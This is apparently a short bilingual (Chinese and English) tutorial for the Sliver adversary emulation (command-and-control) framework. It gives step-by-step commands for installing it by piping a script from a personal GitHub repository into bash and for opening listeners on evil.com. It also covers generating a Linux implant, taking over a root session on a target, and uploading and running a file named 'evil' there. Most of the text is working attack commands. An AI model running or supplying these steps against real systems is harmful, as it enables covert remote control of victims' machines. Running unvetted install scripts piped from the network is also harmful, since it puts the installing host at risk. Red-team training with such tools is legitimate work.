Adversary Emulation Framework.

## 1. Install

安装

```
┌──(sec@debian)-[~]
└─$ curl -fsSL https://github.com/jadensalas469466/script/raw/main/sliver_install.sh | bash
```

## 2. Usage

### 2.1. Server

> 用于与目标建立稳定连接

开机自启

```
┌──(sec@debian)-[~]
└─$ sudo systemctl enable --now sliver.service
```

进入 Server

```
┌──(sec@debian)-[~]
└─$ sliver-server
```

退出 Server

```
[server] sliver > exit
```

### 2.1.1. 连接 Client

开启 `31337` 端口

```
┌──(sec@debian)-[~]
└─$ sudo ufw allow 31337
```

生成 Client 配置

```
[server] sliver > new-operator -n sec -l evil.com -p 31337
```

开启多端控制

```
[server] sliver > multiplayer
```

查看已加入的控制器

```
[server] sliver > operators
```

### 2.1.2. 连接 Implant

开启 `65135` 端口

```
┌──(sec@debian)-[~]
└─$ sudo ufw allow 65135
```

生成 Implant

```
[server] sliver > generate -o linux -m evil.com:65135
```

监听 Implant

```
[server] sliver > mtls -l 65135
```

查看监听任务

```
[server] sliver > jobs
```

等待目标执行 Implant 后查看会话

```
[server] sliver > sessions

 ID         Transport   Remote Address        Hostname   Username   Operating System   Health
========== =========== ===================== ========== ========== ================== =========
 685a7144   mtls        example.com:32804   morpheus   root       linux/amd64        [ALIVE]
```

进入会话

```
[server] sliver > use  685a7144
```

### 2.2. Client

> 用于在 Client 控制与 Server 建立连接的 Implant

导入 Client 配置文件

```
┌──(sec@debian)-[~]
└─$ sliver-client import ~/.sliver-client/configs/nemo_evil.com.cfg
```

运行 Client

```
┌──(sec@debian)-[~]
└─$ sliver-client
```

查看已加入的控制器

```
[server] sliver > operators
```

退出 Client

```
sliver > exit
```

### 2.3. Implant

断开会话

```
[server] sliver (implant) > close
```

上传本地文件到目标

```
[server] sliver (implant) > upload ./evil ./example
```

添加执行权限

```
[server] sliver (implant) > chmod ./example 755
```

执行程序

```
[server] sliver (implant) > execute ./example
```

---

References

- [sliver](https://github.com/BishopFox/sliver)

